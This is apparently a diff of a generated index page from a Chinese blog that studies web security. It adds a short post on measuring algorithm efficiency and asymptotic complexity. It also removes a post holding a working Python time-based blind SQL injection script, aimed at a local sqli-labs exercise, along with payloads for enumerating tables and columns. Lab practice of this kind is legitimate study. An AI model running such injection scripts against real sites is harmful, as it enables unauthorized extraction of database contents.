@@ -71,6 +71,46 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-算法效率的度量方法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/17/%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E7%9A%84%E5%BA%A6%E9%87%8F%E6%96%B9%E6%B3%95/" class="article-date">
+  <time class="dt-published" datetime="2022-04-17T06:04:38.586Z" itemprop="datePublished">2022-04-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/04/17/%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E7%9A%84%E5%BA%A6%E9%87%8F%E6%96%B9%E6%B3%95/">算法效率的度量方法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>算法效率的度量方法：<br>事后统计方法：通过设计好的测试程序和数据，利用计算机计时器对不同算法编制的程序的运行时间进行比较（不要这样嘞）<br>事前分析估算方法：在计算机程序编写前，依据统计方法对算法进行估算。<br>影响因素：<br>1、算法采用的策略、方法<br>2、编译产生的代码质量<br>3、问题的输入规模<br>4、机器执行指令的速度<br>（算法的好坏和输入规模）</p>
+<p>我们研究算法的复杂度，侧重的是研究算法随着输入规模扩大增长量的一个抽象，而不是<br>精确的定位需要执行多少次，重要的是把基本操作的数量和输入模式关联起来<br>函数的渐近增长，类似数学的极限等价高阶低阶无穷的判断，即函数的常数项和其他的<br>次要项常常可以忽略。主要关注主项，但可以忽略与主项相乘的常数项。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/17/%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E7%9A%84%E5%BA%A6%E9%87%8F%E6%96%B9%E6%B3%95/" data-id="cl22vvyys000pl4vjc1zbcc47" data-title="算法效率的度量方法" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-数据类型之间的转换" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/04/17/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2/" class="article-date">
@@ -491,38 +531,6 @@ include ($file);
 
 
   
-    <article id="post-python盲注脚本" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/04/17/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" class="article-date">
-  <time class="dt-published" datetime="2022-04-17T06:04:38.548Z" itemprop="datePublished">2022-04-17</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding:utf-8"></a>coding:utf-8</h1><p>import requests<br>import datetime<br>import time</p>
-<h1 id="获取数据库名长度"><a href="#获取数据库名长度" class="headerlink" title="获取数据库名长度"></a>获取数据库名长度</h1><p>def database_len():<br>    for i in range(1, 10):<br>        url &#x3D; “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/index.php&quot;">http://127.0.0.1/sqli-labs/Less-5/index.php&quot;</a><br>        payload &#x3D; “ ?id&#x3D;1’ and if(length(database())&gt;%s,sleep(1),0) –+” % i<br>        # print(url+payload+’%23’)<br>        time1 &#x3D; datetime.datetime.now()<br>        r &#x3D; requests.get(url + payload)<br>        time2 &#x3D; datetime.datetime.now()<br>        sec &#x3D; (time2 - time1).seconds<br>        if sec &gt;&#x3D; 1:<br>            print(i)<br>        else:<br>            print(i)<br>            break<br>    print(‘database_len:’, i)</p>
-<p>#获取数据库名<br>def database_name():<br>    name &#x3D; ‘’<br>    for j in range(1,9):<br>        for i in ‘0123456789abcdefghijklmnopqrstuvwxyz’:<br>            url &#x3D; “<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/index.php&quot;">http://127.0.0.1/sqli-labs/Less-5/index.php&quot;</a><br>            payload &#x3D; “?id&#x3D;1’ and if(substr(database(),%d,1)&#x3D;’%s’,sleep(3),1) –+” % (j,i)<br>            #print(url+payload)<br>            time1 &#x3D; datetime.datetime.now()<br>            r &#x3D; requests.get(url + payload)<br>            time2 &#x3D; datetime.datetime.now()<br>            sec &#x3D; (time2 - time1).seconds<br>            if sec &gt;&#x3D;3:<br>                name +&#x3D; i<br>                print(name)<br>                break<br>    print(‘database_name:’, name)</p>
-<p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    database_name()<br>?id&#x3D;1’ and if(substr(database(),%d,1)&#x3D;’%s’,sleep(3),1) – +<br>暴表：<br>?id&#x3D;1’ and if(substr(select table_ name from information_schema.tables where table_schema&#x3D;database(),%d,1))<br>爆列：<br>?id&#x3D;1’ and if(substr(select columns_name from infomation_schema.columns where table_shema&#x3D;database(),%d,1))<br>————————————————</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/17/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/" data-id="cl22vvyyp000il4vjdmkw0010" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -559,6 +567,10 @@ include ($file);
       <ul>
         
           <li>
+            <a href="/2022/04/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2022/04/17/less%2046~53%20order%20by%E6%B3%A8%E5%85%A5/">(no title)</a>
           </li>
         
@@ -572,10 +584,6 @@ include ($file);
         
           <li>
             <a href="/2022/04/17/less%2029~31/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/04/17/less%2018~22/">(no title)</a>
           </li>
         
       </ul>
